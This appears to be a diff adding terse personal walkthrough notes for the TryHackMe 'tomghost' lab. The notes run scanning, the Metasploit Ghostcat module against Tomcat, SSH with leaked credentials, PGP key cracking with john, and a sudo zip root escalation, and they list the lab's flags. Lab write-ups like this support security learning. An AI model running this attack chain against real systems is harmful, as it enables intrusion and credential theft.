@@ -1,0 +1,82 @@
+tomghost
+
+ping 10.10.162.110
+nmap -sV -sC -Pn -vv -p- 10.10.162.110
+
+search on google: apache tomcat 9.0.30 exploit
+
+https://www.exploit-db.com/exploits/49039
+
+
+searchsploit Ghostcat  
+
+msfconsole -q
+search Ghostcat
+use auxiliary/admin/http/tomcat_ghostcat
+set rhosts 10.10.162.110
+exploit
+
+cat /home/Faizee/.msf4/loot/20221130034109_default_10.10.162.110_WEBINFweb.xml_442747.txt
+
+GOT usernme:paaswd
+
+skyfuck:8730281lkjlkjdqlksalks
+
+ssh skyfuck@10.10.162.110
+
+GOT SHELL.
+
+skyfuck@ubuntu:~$ ll
+skyfuck@ubuntu:~$ cd /home/
+skyfuck@ubuntu:/home$ ll
+skyfuck@ubuntu:/home$ cd merlin/
+skyfuck@ubuntu:/home/merlin$ cat user.txt 
+
+THM{GhostCat_1s_so_cr4sy}
+
+/home/skyfuck
+
+credential.pgp
+tryhackme.asc
+
+skyfuck@ubuntu:~$ gpg --decrypt credential.pgp 
+
+Attacker machine downlaod.
+
+scp skyfuck@10.10.162.110:credential.pgp .
+scp skyfuck@10.10.162.110:tryhackme.asc .
+
+gpg2john tryhackme.asc > hash.txt
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+alexandru        (tryhackme)  
+
+gpg --import tryhackme.asc
+
+alexandru
+
+gpg --decrypt credential.pgp 
+
+alexandru
+
+GOT 
+
+merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
+
+ssh merlin@10.10.162.110
+asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
+
+merlin@ubuntu:~$ sudo -l
+
+    (root : root) NOPASSWD: /usr/bin/zip
+
+
+https://gtfobins.github.io/gtfobins/zip/
+
+TF=$(mktemp -u)
+sudo zip $TF /etc/hosts -T -TT 'sh #'
+
+# id
+# cd /root
+# cat root.txt
+THM{Z1P_1S_FAKE}
